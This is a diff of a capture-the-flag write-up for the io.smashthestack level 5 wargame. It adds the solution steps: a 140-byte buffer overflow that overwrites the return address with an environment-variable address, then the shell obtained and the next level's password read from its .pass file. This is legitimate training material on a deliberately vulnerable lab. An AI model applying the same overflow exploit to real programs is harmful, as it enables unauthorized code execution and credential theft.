@@ -97,8 +97,17 @@ Go on: i run $(python -c 'print "A"*140+ "B"*4')
 
 Value eip is overwritened, i replace B by value address of environment address (0xbfffd87c)
 
-http://securitydaily.net/writeup-ctf-io-smashthestack-org-level-05/
-http://www.lopisec.com/2011/12/smashthestack-io-level-5-writing-my.html
+bingo, we should run program at dir contain file hihi.c (get address ev)
+
+level5@io:/tmp/hehe$ gcc hihi.c -o hihi
+level5@io:/tmp/hehe$ ./hihi 
+0xbfffd87c  -->> this is address EV
+level5@io:/tmp/hehe$ /levels/level05 $(python -c 'print "A"*140 +"\x7c\xd8\xff\xbf"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|���
+sh-4.3$ cat /home/level6/.pass 
+fQ8W8YlSBJBWKV2R
+sh-4.3$ 
+
 
 
 
